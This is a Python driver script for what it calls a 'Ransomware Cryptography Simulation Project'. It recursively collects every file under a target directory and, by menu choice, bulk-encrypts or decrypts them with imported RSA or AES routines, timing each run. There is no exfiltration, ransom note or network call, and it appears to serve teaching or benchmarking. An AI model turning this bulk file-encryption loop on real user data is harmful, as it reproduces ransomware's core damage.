import glob
import os
from settings import TARGET_DIR, ENC_EXT
from rsa_algorithm.encrypt import encryptRSA
from rsa_algorithm.decrypt import decryptRSA
from rsa_algorithm.manage_key import generateRSAKeys
import pathlib
import time
from aes_algorithm.encrypt import encryptAES
from aes_algorithm.decrypt import decryptAES
from aes_algorithm.manage_key import generateAESKey
import secrets


def getFiles(path):
    print(f'\n[+] Searching files in {os.getcwd()}/{TARGET_DIR}')
    normal_files = []
    encrypted_files = []

    path = path + '/**'
    for file in glob.glob(path, recursive=True):
        if os.path.isfile(file):
            file_ext = pathlib.Path(file).suffix
            if file_ext != ENC_EXT:
                normal_files.append(file)
            elif file_ext == ENC_EXT:
                encrypted_files.append(file)

    print(f'[+] Found {len(normal_files)} normal files')
    print(f'[+] Found {len(encrypted_files)} encrypted files')

    return (normal_files, encrypted_files)


def setAlgorithm():
    print("\n")
    print("[?] Select Algorithm")
    print("[1] RSA-1024")
    print("[2] AES-256")
    print("[3] ECDSA-256")
    algorithm = int(input("Enter your choice: "))

    return algorithm


def setMode():
    print("\n")
    print("[?] Select Mode")
    print("[1] Encrypt")
    print("[2] Decrypt")
    mode = int(input("Enter your choice: "))

    return mode


if __name__ == '__main__':
    print("Welcome to Ransomware Cryptography Simulation Project")
    algorithm = setAlgorithm()
    (normal_files, encrypted_files) = getFiles(TARGET_DIR)

    if algorithm == 1:
        # generateRSAKeys()

        mode = setMode()
        start_time = time.time()
        if mode == 1:
            encryptRSA(normal_files)
            passed_time = time.time() - start_time
            print(
                f"\n[+] Time passed: {passed_time} seconds in RSA/Encryption mode")
        elif mode == 2:
            decryptRSA(encrypted_files)
            passed_time = time.time() - start_time
            print(
                f"\n[+] Time passed: {passed_time} seconds in RSA/Decryption mode")
        else:
            print("Invalid Choice")

    elif algorithm == 2:
        # generateAESKey(secrets.token_hex(32))
        mode = setMode()
        start_time = time.time()
        if mode == 1:
            encryptAES(normal_files)
            passed_time = time.time() - start_time
            print(
                f"\n[+] Time passed: {passed_time} seconds in AES/Encryption mode")
        elif mode == 2:
            decryptAES(encrypted_files)
            passed_time = time.time() - start_time
            print(
                f"\n[+] Time passed: {passed_time} seconds in AES/Decryption mode")
        else:
            print("Invalid Choice")

    elif algorithm == 3:
        pass
    else:
        print("Invalid Choice")
